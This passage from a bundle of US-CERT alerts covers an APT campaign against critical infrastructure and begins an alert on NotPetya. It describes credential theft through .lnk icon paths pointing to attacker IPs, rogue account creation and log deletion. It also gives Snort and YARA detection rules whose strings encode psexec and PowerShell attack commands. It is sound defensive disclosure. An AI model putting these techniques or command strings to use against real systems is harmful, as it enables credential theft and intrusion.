&lt;StartBoundary&gt;2017-06-25T12:30:29&lt;/StartBoundary&gt;</p><p>   &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;/TimeTrigger&gt;</p><p> &lt;/Triggers&gt;</p><p> &lt;Principals&gt;</p><p>  &lt;Principal id=\"Author\"&gt;</p><p>   &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</p><p>   &lt;UserId&gt;&lt;REDACTED USERNAME&gt;&lt;/UserId&gt;</p><p>   &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</p><p>  &lt;/Principal&gt;</p><p> &lt;/Principals&gt;</p><p> &lt;Settings&gt;</p><p>  &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;</p><p>  &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;</p><p>  &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;</p><p>  &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;</p><p>  &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;</p><p>  &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;</p><p>  &lt;IdleSettings&gt;</p><p>   &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;</p><p>   &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;</p><p>  &lt;/IdleSettings&gt;</p><p>  &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</p><p>  &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;Hidden&gt;false&lt;/Hidden&gt;</p><p>  &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;</p><p>  &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;</p><p>  &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;</p><p>  &lt;Priority&gt;7&lt;/Priority&gt;</p><p> &lt;/Settings&gt;</p><p> &lt;Actions Context=\"Author\"&gt;</p><p>  &lt;Exec&gt;</p><p>   &lt;Command&gt;logoff&lt;/Command&gt;</p><p>  &lt;/Exec&gt;</p><p> &lt;/Actions&gt;</p><p>&lt;/Task&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>After achieving access to staging targets, the threat actors installed tools to carry out their mission. On one occasion, threat actors installed the free version of Forticlient, which was presumably used as a VPN client for intended targets.</p><p>Consistent with the perceived goal of credential harvesting, the threat actor was observed dropping and executing open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the threat actor was accessing the system. Of note, the threat actor installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\&lt;Redacted Username&gt;\\Desktop\\OWAExchange\\. In the previous folder structure, a subfolder named “out” held multiple text files.</p><h5>Persistence Through .LNK File Manipulation</h5><p>The threat actors manipulated .lnk files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to their remote controlled server. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection. The threat actors used this tactic in both Virtual Desktop Infrastructure (VDI) and traditional environments.</p><p><img alt=\"Parsed output for file: SETROUTE.lnk\" src=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20Image1.png\" style=\"width: 543px; height: 502px; float: left;\" /></p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p>Three of the observed .lnk files were SETROUTE.lnk, notepad.exe.lnk, and Document.lnk. These names appear to be contextual, and threat actors may use a variety of other file names within this tactic. Two of the remote servers observed in these .lnk files were 62.8.193[.]206 and 5.153.58[.]45.</p><h5>Establishing Local Accounts</h5><p>The threat actors created accounts on the staging target for ongoing operations. These accounts, masquerading as legitimate service accounts, appeared to be tailored to each individual staging target. Each account created by the threat actors served a specific purpose in their operation. DHS and FBI identified the creation of four local accounts on a compromised server. The server operated as both a domain controller and an email server for a staging target.</p><p><strong>Account 1:</strong> The threat actors created a local account, which was named to mimic backup services of the staging target. This account was created by the aforementioned malicious script. The threat actors used this account to conduct open-source reconnaissance and remotely access intended targets. This account was also used to remove the Forticlient software.</p><p><strong>Account 2:</strong> Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.</p><p><strong>Account 3:</strong> The threat actors created Account 3 in the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).</p><p><strong>Account 4:</strong> In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete the following logs: system, security, terminal services, remote services, and audit. Registry analysis indicated that this activity was likely scripted.</p><p><strong>Stage 6: Command and Control</strong></p><p>The threat actors commonly use web shells to compromise publically available servers to gain a foothold into internal networks. This activity has been observed on both web and email servers. The threat actors then establish an encrypted connection over port 443 to the web shell. Once connected, the threat actors download additional malicious files from the threat actors’ servers to the publically available server. Two of the web shells (AutoDiscover.aspx and global.aspx) used by the actors are detailed in the accompanying IOC list. Despite having different file names, the MD5 hashes of the two web shells indicated that the two files were the same file. These web shells have been associated with the ciklon_z webshell.</p><p>DHS and FBI identified the threat actors leveraging remote access services and infrastructure, such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used staging targets to connect to several intended targets, effectively turning the staging targets into command and control points. To date, it is presumed that the threat actors have targeted services that use single-factor authentication. DHS believes that the threat actors employ this methodology to avoid detection and attribution.</p><h5>Targeting of ICS and SCADA Infrastructure</h5><p>Upon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. Specifically, the threat actors focused on identifying and browsing file servers within the intended victim’s network. The threat actors viewed files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were originally named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).</p><p>In one instance, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. In this same incident, the threat actors created a malicious scheduled task that invoked “scr.exe” with the arguments “scr.jpg”. The MD5 hash of scr.exe matched the MD5 of ScreenUtil, a tool used by the threat actor, as reported in the Symantec Dragonfly 2.0 report.</p><h4>Detection and Response</h4><p>IOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these APT actors.</p><h5>Network Signatures and Host-Based Rules</h5><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actors TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.</p><h5>Network Signatures</h5><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>___________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp any any -&gt; any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)</code></p><p>________________________________________</p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1; flow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]{3}=[a-z0-9]{32}&amp;/U\"; classtype:bad-unknown; metadata:service http;)</code></p><p><code>__________________________________________</code></p><p><code>alert tcp $EXTERNAL_NET [139,445] -&gt; $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1; flow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad-unknown; metadata:service netbios-ssn;)</code><br /> </p><h5>YARA Rules</h5><p>This is a consolidated rule set for malware associated with, consisting of rules written by US-CERT, as well as contributions by trusted partners.</p><p><code>*/</code></p><p> </p><p><code>rule APT_malware_1</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"inveigh pen testing tools &amp; related artifacts\"</code></p><p><code>      author = \"US-CERT Code Analysis Team\"    </code></p><p><code>      date = \"2017/07/17\"</code></p><p><code>      hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"</code></p><p><code>      hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"</code></p><p><code>      hash2 = \"BA756DD64C1147515BA2298B6A760260\"</code></p><p><code>      hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"</code></p><p><code>      hash4 = \"04738CA02F59A5CD394998A99FCD9613\"</code></p><p><code>      hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"</code></p><p><code>      hash6 = \"65A1A73253F04354886F375B59550B46\"</code></p><p><code>      hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"</code></p><p><code>      hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"</code></p><p><code>      hash9 = \"722154A36F32BA10E98020A8AD758A7A\"</code></p><p><code>      hash10 = \"4595DBE00A538DF127E0079294C87DA0\"</code></p><p><code>strings:</code></p><p><code>      $s0 = \"file://\"</code></p><p><code>      $s1 = \"/ame_icon.png\"</code></p><p><code>      $s2 = \"184.154.150.66\"</code></p><p><code>      $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }</code></p><p><code>      $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }</code></p><p><code>      $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"</code></p><p><code>      $s6 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"</code></p><p><code>      $s8 = \"NlZzSZk=\"</code></p><p><code>      $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"</code></p><p><code>      $s10 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"</code></p><p><code>      $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"</code></p><p><code>      $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }</code></p><p><code>      $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }</code></p><p><code>      $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }</code></p><p> </p><p> </p><p><code>//inveigh pentesting tools</code></p><p> </p><p><code>      $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }</code></p><p> </p><p><code>//specific malicious word document PK archive</code></p><p> </p><p><code>      $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }</code></p><p><code>      $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }</code></p><p><code>      $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }</code></p><p><code>      $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s22 = \"5.153.58.45\"</code></p><p><code>      $s23 = \"62.8.193.206\"</code></p><p><code>      $s24 = \"/1/ree_stat/p\"</code></p><p><code>      $s25 = \"/icon.png\"</code></p><p><code>      $s26 = \"/pshare1/icon\"</code></p><p><code>      $s27 = \"/notepad.png\"</code></p><p><code>      $s28 = \"/pic.png\"</code></p><p><code>      $s29 = \"http://bit.ly/2m0x8IH\"</code></p><p><code>     </code></p><p><code>condition:</code></p><p><code>      ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)</code></p><p><code>}</code></p><p> </p><p><code>rule APT_malware_2</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"rule detects malware\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }</code></p><p><code>      $http_push = \"X-mode: push\" nocase</code></p><p><code>      $http_pop = \"X-mode: pop\" nocase</code></p><p><code>condition:</code></p><p><code>      any of them</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC_PT_2</code></p><p><code>{</code></p><p><code>      meta:</code></p><p><code>            name= \"Query_XML_Code_MAL_DOC_PT_2\"</code></p><p><code>            author = \"other\"</code></p><p><code>      strings:</code></p><p><code>            $zip_magic = { 50 4b 03 04 }</code></p><p><code>            $dir1 = \"word/_rels/settings.xml.rels\"</code></p><p><code>            $bytes = {8c 90 cd 4e eb 30 10 85 d7}</code></p><p><code>      condition:</code></p><p><code>            $zip_magic at 0 and $dir1 and $bytes</code></p><p><code>}</code></p><p> </p><p><code>rule Query_Javascript_Decode_Function</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_Javascript_Decode_Function\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}</code></p><p><code>      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}</code></p><p><code>      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}</code></p><p><code>      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}</code></p><p><code>      $func_call=\"a(\\\"\"</code></p><p><code>condition:</code></p><p><code>      filesize &lt; 20KB and #func_call &gt; 20 and all of ($decode*)</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_XML_Code_MAL_DOC\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $zip_magic = { 50 4b 03 04 }</code></p><p><code>      $dir = \"word/_rels/\" ascii</code></p><p><code>      $dir2 = \"word/theme/theme1.xml\" ascii</code></p><p><code>      $style = \"word/styles.xml\" ascii</code></p><p><code>condition:</code></p><p><code>      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd</code></p><p><code>}</code></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>This APT actor’s campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>DHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.</p><h4>Network and Host-based Signatures</h4><p>DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to their watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network has experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to identify malicious activity.</p><h4>Detections and Prevention Measures</h4><ul><li>Users and administrators can detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the IOC packages to the following locations:<ul><li>network intrusion detection system/network intrusion protection system  logs,</li><li>web content logs,</li><li>proxy server logs,</li><li>domain name server resolution logs,</li><li>packet capture (PCAP) repositories,</li><li>firewall logs,</li><li>workstation Internet browsing history logs,</li><li>host-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,</li><li>data loss prevention logs,</li><li>exchange server logs,</li><li>user mailboxes,</li><li>mail filter logs,</li><li>mail content logs,</li><li>AV mail logs,</li><li>OWA logs,</li><li>Blackberry Enterprise Server logs, and</li><li>Mobile Device Management logs.</li></ul></li><li>To detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following locations:<ul><li>application logs,</li><li>IIS/Apache logs,</li><li>file system,</li><li>intrusion detection system/ intrusion prevention system logs,</li><li>PCAP repositories,</li><li>firewall logs, and</li><li>reverse proxy.</li></ul></li><li>Detect spear-phishing by searching workstation file systems, as well as network-based user directories, for attachment filenames and hashes found in the IOC packages.</li><li>Detect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.</li><li>Detect evasion techniques by the threat actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system logs.</li><li>Detect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.</li><li>Detect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be reviewed by the account owners.</li><li>Detect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.</li><li>Detect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.</li><li>Detect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.</li><li>Detect persistence on servers by searching system logs for all filenames listed in the IOC packages.</li><li>Detect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell version 5, and PowerShell logging must be enabled prior to the activity.)</li><li>Detect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.</li><li>Detect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”. Services\\MaxInstanceCount” and the value of “REG_DWORD 1” at location “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.</li><li>Detect installation by searching all proxy logs for downloads from URIs without domain names.</li></ul><h4>General Best Practices Applicable to this Campaign:</h4><ul><li>Prevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the NCCIC/US-CERT publication on <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\">SMB Security Best Practices </a>for more information.</li><li>Block the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.</li><li>Monitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).</li><li>Deploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and downloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on the host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.</li><li>Segment any critical networks or control systems from business systems and networks according to industry best practices.</li><li>Ensure adequate logging and visibility on ingress and egress points.</li><li>Ensure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands an attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for monitoring and analysis. See the FireEye blog post <a href=\"http://Greater Visibility through PowerShell Logging\">Greater Visibility through PowerShell Logging </a>for more information.</li><li>Implement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\">Compromised Web Servers and Web Shells – Threat Awareness and Guidance</a>.</li><li>Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.</li><li>Implement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</li><li>Block RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.</li><li>Store system logs of mission critical systems for at least one year within a security information event management tool.</li><li>Ensure applications are configured to log the proper level of detail for an incident response investigation.</li><li>Consider implementing HIPS or other controls to prevent unauthorized code execution.</li><li>Establish least-privilege controls.</li><li>Reduce the number of Active Directory domain and enterprise administrator accounts.</li><li>Based on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.</li><li>Establish a password policy to require complex passwords for all users.</li><li>Ensure that accounts for network administration do not have external connectivity.</li><li>Ensure that network administrators use non-privileged accounts for email and Internet access.</li><li>Use two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access, privileged access, and access to sensitive data).</li><li>Implement a process for logging and auditing activities conducted by privileged accounts.</li><li>Enable logging and alerting on privilege escalations and role changes.</li><li>Periodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for sensitive data that may have inadvertently been included.</li><li>Assign sufficient personnel to review logs, including records of alerts.</li><li>Complete independent security (as opposed to compliance) risk review.</li><li>Create and participate in information sharing programs.</li><li>Create and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of asset, and an incident response plan.</li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870.</p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"\">[1] FireEye. Factors Motivating Cyber Espionage Against the Energy Sector. September 3, 2015 09:21:00AM, 15-00008886, Version: 2</a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017. </a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017.</a></li>\n\t\t\t\t\t<li><a href=\"\">[4] CCIRC CF17-010 UPDATE</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5] MIFR-10127623</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>October 20, 2017: Initial version</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-10-20T22:50:54.000Z"
		},
		{
			"type": "report",
			"title": "TA17-181A: Petya Ransomware",
			"name": "TA17-181A: Petya Ransomware",
			"id": "report-0a2cde3e-b321-4f54-9958-311afe62b02a",
			"description": "Original release date: July 01, 2017 | Last revised: February 15, 2018<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Microsoft Windows operating systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p><em>This Alert has been updated to reflect the U.S. Government's public attribution of the \"NotPetya\" malware variant to the Russian military. Additional information may be found in a <a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a>.<em> For more information related to NotPetya activity, go to <a href=\"https://www.us-cert.gov/grizzlysteppe\">https://www.us-cert.gov/grizzlysteppe</a>.</em></em></p><p>The scope of this Alert’s analysis is limited to the newest Petya malware variant that surfaced on June 27, 2017. This malware is referred to as “NotPetya” throughout this Alert.</p><p>On June 27, 2017, NCCIC <a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13]</a> was notified of Petya malware events occurring in multiple countries and affecting multiple sectors. This variant of the Petya malware—referred to as NotPetya—encrypts files with extensions from a hard-coded list. Additionally, if the malware gains administrator rights, it encrypts the master boot record (MBR), making the infected Windows computers unusable. NotPetya differs from previous Petya malware primarily in its propagation methods. </p><p>The NCCIC Code Analysis Team produced a Malware Initial Findings Report (MIFR) to provide in-depth technical analysis of the malware. In coordination with public and private sector partners, NCCIC is also providing additional indicators of compromise (IOCs) in comma-separated-value (CSV) form for information sharing purposes.</p><p>Available Files:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295.pdf\">MIFR-10130295.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295_stix.xml\">MIFR-10130295_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-181B_IOCs.csv\">TA-17-181B_IOCs.csv</a></li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>NotPetya leverages multiple propagation methods to spread within an infected network. According to malware analysis, NotPetya attempts the lateral movement techniques below:</p><ul><li>PsExec - a legitimate Windows administration tool</li><li>WMI - Windows Management Instrumentation, a legitimate Windows component</li><li>EternalBlue - the same Windows SMBv1 exploit used by WannaCry</li><li>EternalRomance - another Windows SMBv1 exploit</li></ul><p>Microsoft released a security update for the <a href=\"https://technet.microsoft.com/library/security/MS17-010\">MS17-010</a> SMB vulnerability on March 14, 2017, which addressed the EternalBlue and EternalRomance lateral movement techniques.</p><p><strong>Technical Details</strong></p><p>NCCIC received a sample of the NotPetya malware variant and performed a detailed analysis. Based on the analysis, NotPetya encrypts the victim’s files with a dynamically generated, 128-bit key and creates a unique ID of the victim. However, there is no evidence of a relationship between the encryption key and the victim’s ID, which means it may not be possible for the attacker to decrypt the victim’s files even if the ransom is paid. It behaves more like destructive malware rather than ransomware.</p><p>NCCIC observed multiple methods used by NotPetya to propagate across a network. The first and—in most cases—most effective method, uses a modified version of the Mimikatz tool to steal the user’s Windows credentials. The cyber threat actor can then use the stolen credentials, along with the native Windows Management Instrumentation Command Line (WMIC) tool or the Microsoft SysInternals utility, psexec.exe, to access other systems on the network. Another method for propagation uses the EternalBlue exploit tool to target unpatched systems running a vulnerable version of SMBv1. In this case, the malware attempts to identify other hosts on the network by checking the compromised system’s IP physical address mapping table. Next, it scans for other systems that are vulnerable to the SMB exploit and installs the malicious payload. Refer to the malware report, MIFR-10130295, for more details on these methods.</p><p>The analyzed sample of NotPetya 